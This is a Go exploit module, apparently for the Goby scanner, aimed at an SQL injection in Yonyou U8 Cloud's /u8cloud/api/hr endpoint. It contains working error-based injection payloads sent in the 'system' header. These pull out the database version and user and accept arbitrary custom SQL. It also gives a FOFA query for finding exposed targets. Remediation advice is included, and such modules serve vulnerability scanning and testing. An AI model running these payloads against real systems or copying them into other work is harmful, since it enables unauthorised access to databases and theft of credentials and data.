package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yongyou U8 Cloud /u8cloud/api/hr file SQL Injection Vulnerability",
    "Description": "<p>The Yonyou NC Cloud large enterprise digital platform deeply applies the new generation of digital intelligence technology, fully based on cloud native architecture, to create an open, interconnected, integrated, and intelligent integrated cloud platform. It focuses on the three major enterprise digital transformation strategic directions of digital management, digital operation, and digital commerce, providing 18 solutions covering digital marketing, financial sharing, global treasury, intelligent manufacturing, agile supply chain, talent management, and intelligent collaboration, helping large enterprises fully implement digital transformation.</p><p>There is an SQL injection vulnerability at the Yonyou U8 Cloud API/hr interface, which may be exploited by malicious attackers to execute malicious SQL statements, view usernames and passwords, and cause information leakage, ultimately leading to server crashes.</p>",
    "Product": "yongyou U8 Cloud",
    "Homepage": "https://www.yonyou.com",
    "DisclosureDate": "2024-04-26",
    "PostTime": "2024-04-28",
    "Author": "15900373599@163.com",
    "FofaQuery": "title==\"U8C\"",
    "GobyQuery": "title==\"U8C\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability at the Yonyou U8 Cloud API/hr interface, which may be exploited by malicious attackers to execute malicious SQL statements, view usernames and passwords, and cause information leakage, ultimately leading to server crashes.</p>",
    "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks </p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range. </p><p>3. Assign database users the minimum permissions, limited to their required operations.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "查看数据库版本,查看用户名,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "-1' or 1=db_name()--+",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/u8cloud/api/hr",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                    "Accept-Charset": "utf-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "system": "-1' or 1=@@version--+"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "将 nvarchar 值",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/u8cloud/api/hr"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/u8cloud/api/hr",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                    "Accept-Charset": "utf-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "system": "-1' or 1=@@version--+"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "将 nvarchar 值",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|将 nvarchar 值(.+?) 转换成"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /u8cloud/api/hr 文件 SQL 注入漏洞",
            "Product": "用友U8 Cloud",
            "Description": "<p>用友NC Cloud大型企业数字化平台，深度应用新一代数字智能技术，完全基于云原生架构，打造开放、互联、融合、智能的一体化云平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。<br></p><p>用友U8 Cloud api/hr接口处存在 SQL注入漏洞，恶意攻击者可能会利用该漏洞执行恶意SQL语句，查看用户名密码等，造成信息泄露，最终可能会导致服务器失陷。<br></p>",
            "Recommendation": "<p>1.使用参数化查询可以有效防止SQL注入攻击&nbsp;</p><p>2.在接受用户输入之前，应该对输入数据进行验证和过滤，确保输入的数据符合预期的格式和范围。&nbsp;</p><p>3.将数据库用户赋予最小的权限，仅限于其所需的操作。<br></p>",
            "Impact": "<p>用友U8 Cloud api/hr接口处存在 SQL注入漏洞，恶意攻击者可能会利用该漏洞执行恶意SQL语句，查看用户名密码等，造成信息泄露，最终可能会导致服务器失陷。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yongyou U8 Cloud /u8cloud/api/hr file SQL Injection Vulnerability",
            "Product": "yongyou U8 Cloud",
            "Description": "<p>The Yonyou NC Cloud large enterprise digital platform deeply applies the new generation of digital intelligence technology, fully based on cloud native architecture, to create an open, interconnected, integrated, and intelligent integrated cloud platform. It focuses on the three major enterprise digital transformation strategic directions of digital management, digital operation, and digital commerce, providing 18 solutions covering digital marketing, financial sharing, global treasury, intelligent manufacturing, agile supply chain, talent management, and intelligent collaboration, helping large enterprises fully implement digital transformation.<br></p><p>There is an SQL injection vulnerability at the Yonyou U8 Cloud API/hr interface, which may be exploited by malicious attackers to execute malicious SQL statements, view usernames and passwords, and cause information leakage, ultimately leading to server crashes.<br></p>",
            "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks&nbsp;</p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range.&nbsp;</p><p>3. Assign database users the minimum permissions, limited to their required operations.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability at the Yonyou U8 Cloud API/hr interface, which may be exploited by malicious attackers to execute malicious SQL statements, view usernames and passwords, and cause information leakage, ultimately leading to server crashes.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10945"
}`

	sqlInjectionXh12gdw := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		httpConfig := httpclient.NewGetRequestConfig("/u8cloud/api/hr")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
		httpConfig.Header.Store("system", sqlPayload)
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "nvarchar") {
			reMsg := regexp.MustCompile("将 nvarchar 值(.*?) 转换成")
			matchesMsg := reMsg.FindStringSubmatch(resp.Utf8Html)
			if len(matchesMsg) > 1 {
				return matchesMsg[1]
			}
		}
		return ""
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var msg string
			var sqlPayload string
			if attackType == "查看数据库版本" {
				sqlPayload = "-1' or 1=@@version--+"
				msg = sqlInjectionXh12gdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else if attackType == "查看用户名" {
				sqlPayload = "-1' or 1=user--+"
				msg = sqlInjectionXh12gdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "custom" {
				sqlPayload = custom
				msg = sqlInjectionXh12gdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "sqlPoint" {
				expResult.Output = "GET /u8cloud/api/hr HTTP/1.1\nHost:  \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nConnection: Keep-Alive\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nsystem: -1' or 1=@@version--+\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nx-forwarded-for: 127.0.0.1"
				expResult.Success = true
				return expResult
			} else {
				expResult.Output = "未知的攻击方式！"
			}
			expResult.Success = true
			expResult.Output = sqlPayload + ":" + msg
			return expResult
		},
	))
}
